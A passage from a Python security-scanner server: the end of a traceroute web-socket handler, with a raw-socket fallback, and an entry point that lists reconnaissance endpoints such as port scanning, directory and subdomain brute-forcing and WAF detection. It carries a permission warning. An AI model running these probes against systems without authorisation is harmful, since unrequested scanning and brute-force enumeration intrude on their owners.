            if shutil.which("traceroute"):
                cmd = ["traceroute","-n","-m",str(max_hops),host]
            elif shutil.which("tracepath"):
                cmd = ["tracepath","-n","-m",str(max_hops),host]

        if cmd:
            await ws.send_json({"type":"info","message":f"Using: {cmd[0]}"})
            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE)

                hop_re   = re.compile(r"^\s*(\d+)\s+(?:(\d+\.\d+)\s+ms.*?|(\*\s*\*\s*\*))\s*([\d.]+)?", re.IGNORECASE)
                hop_re2  = re.compile(r"^\s*(\d+)\s+([\d.]+|[a-zA-Z0-9.-]+|\*)\s+(?:(\d+(?:\.\d+)?)\s*ms)?")
                hop_num  = 0

                async def read_output():
                    nonlocal hop_num
                    while True:
                        line_bytes = await proc.stdout.readline()
                        if not line_bytes:
                            break
                        line = line_bytes.decode(errors="replace").rstrip()
                        if not line.strip():
                            continue

                        # Parse hop line
                        m = hop_re2.match(line)
                        if m:
                            hop_num = int(m.group(1))
                            hop_ip  = m.group(2)
                            rtt_s   = m.group(3)
                            rtt     = float(rtt_s) if rtt_s else None

                            # Try reverse lookup
                            hostname = ""
                            if hop_ip and hop_ip != "*":
                                try:
                                    info = await asyncio.wait_for(
                                        loop.getnameinfo((hop_ip, 0), 0), timeout=1.5)
                                    if info[0] != hop_ip:
                                        hostname = info[0]
                                except Exception:
                                    pass

                            await ws.send_json({"type":"result","data":{
                                "hop":   hop_num,
                                "ip":    hop_ip if hop_ip != "*" else "(timeout)",
                                "hostname": hostname,
                                "rtt_ms":   rtt,
                                "timeout":  hop_ip == "*",
                            }})
                        else:
                            # Info line (e.g. first line of traceroute output)
                            if any(c.isdigit() for c in line) or "traceroute" in line.lower():
                                await ws.send_json({"type":"info","message":line.strip()})

                await asyncio.wait_for(read_output(), timeout=60)
                await proc.wait()
            except asyncio.TimeoutError:
                await ws.send_json({"type":"warn","message":"Traceroute timed out after 60 seconds"})
                try: proc.kill()
                except Exception: pass
        else:
            # Fallback: manual TCP traceroute using raw sockets (TTL manipulation)
            await ws.send_json({"type":"info","message":"No traceroute binary found — using TCP SYN probe fallback"})
            try:
                dest_ip = socket.gethostbyname(host)
            except Exception:
                dest_ip = host

            DEST_PORT = 80
            for ttl in range(1, max_hops + 1):
                t0 = time.monotonic()
                hop_ip = "*"
                try:
                    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    recv_sock.settimeout(2)
                    send_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
                    send_sock.settimeout(2)
                    try:
                        send_sock.connect((dest_ip, DEST_PORT))
                    except Exception:
                        pass
                    try:
                        data_r, addr = recv_sock.recvfrom(1024)
                        hop_ip = addr[0]
                    except Exception:
                        pass
                    send_sock.close()
                    recv_sock.close()
                except Exception:
                    pass
                rtt = round((time.monotonic() - t0) * 1000, 2)
                await ws.send_json({"type":"result","data":{
                    "hop":ttl,"ip":hop_ip,"hostname":"","rtt_ms":rtt if hop_ip!="*" else None,"timeout":hop_ip=="*"}})
                if hop_ip == dest_ip:
                    break

        await ws.send_json({"type":"done","message":f"Traceroute complete to {host}"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import uvicorn
    banner = r"""
  ███████╗ ██████╗ █████╗ ███╗   ██╗██╗  ██╗
  ██╔════╝██╔════╝██╔══██╗████╗  ██║╚██╗██╔╝
  ███████╗██║     ███████║██╔██╗ ██║ ╚███╔╝
  ╚════██║██║     ██╔══██║██║╚██╗██║ ██╔██╗
  ███████║╚██████╗██║  ██║██║ ╚████║██╔╝ ██╗
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝"""
    print("\033[92m" + banner + "\033[0m")
    print("  \033[96mAdvanced Security Scanner v3.0  //  by iamunknown77\033[0m")
    print("  \033[90m" + "─"*54 + "\033[0m")
    print("  \033[93m⚠  Use only on systems you own or have permission to test.\033[0m")
    print()
    endpoints = [
        ("/ws/portscan",    "TCP port scanner + banner grab + OS detect"),
        ("/ws/udpscan",     "UDP scanner with protocol probes"),
        ("/ws/dirscan",     "Directory brute-forcer (recursive, proxy, preview)"),
        ("/ws/subdomain",   "DNS subdomain brute-force enumeration"),
        ("/ws/sslcheck",    "SSL/TLS certificate & cipher inspector"),
        ("/ws/headercheck", "HTTP security header auditor + cookie flags"),
        ("/ws/dns",         "DNS record lookup (A/AAAA/MX/TXT/NS/CNAME/SOA/PTR)"),
        ("/ws/ping",        "TCP-based reachability probe with RTT stats"),
        ("/ws/techscan",    "Technology & CMS fingerprinting (100+ signatures)"),
        ("/ws/whois",       "WHOIS + IP geolocation & ASN info"),
        ("/ws/emailsec",    "Email security: SPF / DMARC / DKIM / MTA-STS"),
        ("/ws/wafdetect",   "WAF / CDN / firewall detection"),
        ("/ws/corsscan",    "CORS misconfiguration scanner"),
        ("/ws/vulnscan",    "Vulnerability hints (CVE advisories per service)"),
        ("/ws/traceroute",  "Network path tracing"),
    ]
    for ep, desc in endpoints:
        print(f"  \033[92m●\033[0m  {ep:<22} \033[90m{desc}\033[0m")
    print()
    print(f"  \033[92m●  API: http://0.0.0.0:8000\033[0m\n")
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
